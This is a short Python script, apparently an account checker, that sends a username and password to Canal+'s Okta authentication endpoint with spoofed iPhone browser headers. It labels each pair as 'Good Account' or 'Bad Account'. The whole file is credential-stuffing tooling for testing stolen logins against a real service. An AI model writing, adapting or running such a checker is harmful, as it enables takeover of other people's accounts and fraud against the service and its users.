import requests

def main(username,password):
    headers = {
        "Host": "pass.canalplus.com",
        "Proxy-Connection": "keep-alive",
        "Connection": "keep-alive",
        "Accept": "application/json",
        "x-okta-user-agent-extended": "okta-signin-widget-4.5.2",
        "Accept-Language": "en",
        "Origin": "https://pass.canalplus.com",
        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 14_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148",
        "Referer": "https://pass.canalplus.com/",
        "Accept-Encoding": "gzip, deflate",
        "Content-Type": "application/json"
    }

    datam = {"password":f"{password}","username":f"{username}","options":{"warnBeforePasswordExpired":"true","multiOptionalFactorEnroll":"true"}}

    req = requests.post("https://pass.canalplus.com/api/v1/authn", json=datam, headers=headers)

    if "Authentication failed" in req.text: return "Bad Account"
    elif "\"status\":\"SUCCESS" in req.text: return "Good Account"
